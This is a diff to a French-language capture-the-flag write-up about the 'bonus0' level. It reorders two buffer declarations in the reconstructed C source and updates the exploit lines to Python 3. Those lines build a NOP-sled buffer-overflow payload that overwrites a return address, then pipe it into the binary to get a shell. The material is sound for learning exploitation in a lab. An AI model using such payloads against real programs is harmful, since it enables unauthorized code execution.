@@ -46,8 +46,8 @@ void p(char *string, char *string2) // <--------1 received string, 20 bytes buff
 
 void pp(char *string)
 {
-    char buffer[20];
     char buffer2[20];
+    char buffer[20];
 
     p(buffer2, " - ");
     p(buffer, " - ");
@@ -201,7 +201,7 @@ Je vois mon `NOP sled` à la fin de la première adresse, et prend donc la secon
 Je peux donc tenter de construire mon payload :
 
 ```python
-python -c 'print "\x90" * 20'; python -c 'print "\x90" * 14 + "\xbf\xff\xff\x25"[::-1] + "\x90"'
+python -c 'print("\x90" * 20)'; python -c 'print("\x90" * 14 + "\xbf\xff\xff\x25"[::-1] + "\x90")'
 ```
 
 Ce qui remplis le premier buffer de `NOP`, puis le second de 14 bytes de `NOP` et enfin l'adresse qui pointe sur le shellcode, puis 1 byte qui correspondait a la null termination du buffer (1).
@@ -209,7 +209,7 @@ Ce qui remplis le premier buffer de `NOP`, puis le second de 14 bytes de `NOP` e
 Je l'essaye :
 
 ```bash
-$ (python -c 'print "\x90" * 20'; python -c 'print "\x90" * 14 + "\xbf\xff\xff\x25"[::-1] + "\x90"'; cat) | ./bonus0
+$ (python -c 'print("\x90" * 20)'; python -c 'print("\x90" * 14 + "\xbf\xff\xff\x25"[::-1] + "\x90")'; cat) | ./bonus0
  -
  -
 ����������������������������������%���� ��������������%����
